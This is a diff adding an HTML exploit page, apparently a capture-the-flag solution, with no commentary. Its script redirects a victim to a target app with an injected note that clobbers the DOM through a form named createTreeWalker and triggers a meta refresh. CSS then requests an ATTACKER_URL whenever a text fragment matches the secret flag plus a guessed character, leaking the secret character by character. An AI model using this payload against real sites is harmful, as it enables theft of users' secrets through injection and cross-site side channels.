@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8" />
+	</head>
+	<body>
+		<script>
+			function create(s) {
+				window.location = TARGET_URL + "?note=" + encodeURIComponent(s);
+			}
+			create(
+				`<form name="createTreeWalker"></form><meta http-equiv="refresh" content="1; url=` +
+					TARGET_URL +
+					"?note=" +
+					encodeURIComponent(`<style>
+	:target::before {
+		content: url("${ATTACKER_URL}found");
+	}
+	</style>`) +
+					`#:~:text=${FLAG + CHAR}">`
+			);
+		</script>
+	</body>
+</html>
